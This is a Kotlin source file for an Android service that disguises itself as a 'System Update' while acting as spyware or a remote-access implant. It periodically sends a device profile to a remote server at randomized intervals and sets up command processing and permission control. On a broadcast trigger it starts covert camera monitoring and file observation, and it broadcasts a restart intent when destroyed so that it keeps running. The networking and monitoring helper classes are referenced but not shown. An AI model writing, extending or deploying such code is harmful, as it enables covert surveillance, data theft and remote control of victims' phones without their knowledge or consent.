package com.android.system.update.core

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.IBinder
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import com.android.system.update.modules.ai.SensitiveMediaMonitor
import java.security.MessageDigest
import java.security.SecureRandom
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec

class CoreService : Service() {

    private lateinit var networkManager: NetworkConnectionManager
    private lateinit var deviceAnalyzer: DeviceProfileAnalyzer
    private lateinit var commandProcessor: CommandProcessor
    private lateinit var permissionController: SystemPermissionController
    private lateinit var obfuscator: DataObfuscator
    private lateinit var mediaMonitor: SensitiveMediaMonitor
    private lateinit var deviceKey: ByteArray

    private val handler = Handler(Looper.getMainLooper())
    private val syncInterval = 60000L
    private val random = SecureRandom()

    private val monitorReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            if (intent?.action == "START_SENSITIVE_MONITOR") {
                mediaMonitor.startCameraMonitoring()
                mediaMonitor.startFileObservation()
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "default"
        deviceKey = MessageDigest.getInstance("SHA-256").digest(androidId.toByteArray())

        networkManager = NetworkConnectionManager(this)
        deviceAnalyzer = DeviceProfileAnalyzer(this)
        permissionController = SystemPermissionController(this)
        obfuscator = DataObfuscator(this)
        commandProcessor = CommandProcessor(this)
        mediaMonitor = SensitiveMediaMonitor(this)

        val filter = IntentFilter("START_SENSITIVE_MONITOR")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(monitorReceiver, filter, RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(monitorReceiver, filter)
        }

        startForegroundService()
        startPeriodicSync()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun startForegroundService() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channelId = "system_update_channel"
            val channel = NotificationChannel(channelId, "System Update", NotificationManager.IMPORTANCE_LOW)
            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            manager.createNotificationChannel(channel)
            val notification = Notification.Builder(this, channelId)
                .setContentTitle("System Update")
                .setContentText("Maintaining system stability")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .build()
            startForeground(1001, notification)
        }
    }

    private fun startPeriodicSync() {
        handler.post(object : Runnable {
            override fun run() {
                try {
                    if (networkManager.checkConnectivity()) {
                        val profile = deviceAnalyzer.getDeviceProfile()
                        networkManager.sync(profile)
                    }
                } catch (e: Exception) {
                }
                handler.postDelayed(this, syncInterval + random.nextInt(30000))
            }
        })
    }

    override fun onDestroy() {
        unregisterReceiver(monitorReceiver)
        mediaMonitor.cleanup()
        handler.removeCallbacksAndMessages(null)
        val intent = Intent("com.android.system.update.RESTART")
        sendBroadcast(intent)
        super.onDestroy()
    }
}